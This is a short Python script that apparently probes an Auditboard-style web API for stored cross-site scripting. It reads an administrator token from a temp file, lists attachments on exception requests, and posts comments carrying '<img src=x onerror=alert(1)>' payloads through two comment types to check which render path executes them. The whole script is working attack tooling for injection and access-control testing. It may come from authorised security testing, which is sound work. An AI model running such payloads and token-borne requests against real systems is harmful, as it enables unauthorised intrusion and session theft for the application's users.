import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
print("=== file-scoped comment: does it use a different render path? ===")
# find a file id on exception 33
cmd=['curl','-s','-m','25',H+'/api/v1/attachments?filter[attachable_type][eq]=ExceptionRequest','-H','token: '+TOK,'-H',BB]
r=subprocess.run(cmd,capture_output=True,text=True).stdout
try:
    ats=json.loads(r).get('attachments') or []
    print(f"  attachments visible: {len(ats)}")
    for a in ats[:5]:
        print(f"    id={a['id']} name={a.get('name')} type={a.get('attachable_type')} cid={a.get('attachable_id')} file_id={a.get('file_id')}")
except Exception as e: print("  ",r[:200])
print()
# try commenting with origin_file_id
for body in [
 {"comment":{"type":"Comment","commentable_type":"ExceptionRequest","commentable_id":33,
             "message_raw":f'<img src=x onerror=alert(1)>{tag}',
             "message_html":f'<img src=x onerror=alert(1)>{tag}',"origin_file_id":2712}},
 {"comment":{"type":"FileComment","commentable_type":"File","commentable_id":2712,
             "message_raw":f'<img src=x onerror=alert(1)>{tag}',
             "message_html":f'<img src=x onerror=alert(1)>{tag}'}},
]:
    c,b=post(body)
    print(f"  {body['comment'].get('type')} -> {c} {b[:110].replace(chr(10),' ')}")
